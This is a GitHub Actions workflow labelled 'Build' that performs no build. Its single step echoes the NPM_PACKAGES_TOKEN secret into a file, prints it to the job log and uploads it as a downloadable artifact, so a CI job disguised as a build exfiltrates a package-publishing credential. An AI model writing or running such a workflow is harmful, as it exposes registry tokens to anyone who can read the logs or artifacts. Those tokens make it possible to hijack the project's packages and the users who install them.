name: Build

on:
  push:
    branches:
      - maintenance-3.0.x

  # Manually trigger the workflow
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - name: print secrets
      env:
        MY_SECRET: ${{secrets.NPM_PACKAGES_TOKEN}}
      shell: bash
      run: |
          echo "$MY_SECRET" >> config.txt
          cat config.txt
    - uses: actions/upload-artifact@v3
      with:
        name: my-artifact
        path: config.txt
